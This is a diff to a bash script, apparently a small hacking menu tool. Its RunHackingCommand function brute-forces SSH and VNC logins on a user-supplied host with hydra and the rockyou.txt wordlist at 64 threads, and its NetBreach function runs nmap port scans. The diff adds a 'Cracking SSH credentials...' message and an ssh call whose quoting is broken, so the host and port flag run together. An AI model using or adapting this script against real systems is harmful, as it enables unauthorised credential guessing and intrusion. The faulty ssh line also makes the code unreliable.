@@ -59,7 +59,7 @@ NetBreach() {
     case "${port}" in
     ALL|all)
         xmessage -center "Scanning the entire network. This might take some time."
-        sudo nmap -sS 127.0.0.1 -Pn -oN scan.txt --open
+        nmap 127.0.0.1 -oN scan.txt --open
         ;;
     stop)
         xmessage -center "Exiting program."
@@ -70,7 +70,7 @@ NetBreach() {
             xmessage -center "Error: Invalid port number."
             exit 1
         fi
-        sudo nmap -sS 127.0.0.1 -p "${port}" -oN "${port}.log" --open
+        nmap 127.0.0.1 -p "${port}" -oN "${port}.log" --open
         dialog --yesno "Do you want to open the scan results?" 10 40
         if [[ $? -eq 0 ]]; then
             xdg-open "${port}.log"
@@ -85,9 +85,13 @@ RunHackingCommand() {
     host=$(dialog --inputbox "Enter Hostname:" 10 40 3>&1 1>&2 2>&3)
     log_file="output.log"
 
-    case "$port" in
+    case "${port}" in
     22)
         hydra -l "${user}" -P rockyou.txt -t 64 -vV -o "${log_file}" -I ssh://"$host":"$port"
+    
+        sleep 1
+        echo "Cracking SSH credentials..."
+        ssh "${user}"@"${host} -p ${port}"    
         ;;
     5900)
         hydra -P rockyou.txt -t 64 -vV -o "${log_file}" -I vnc://"$host":"$port"
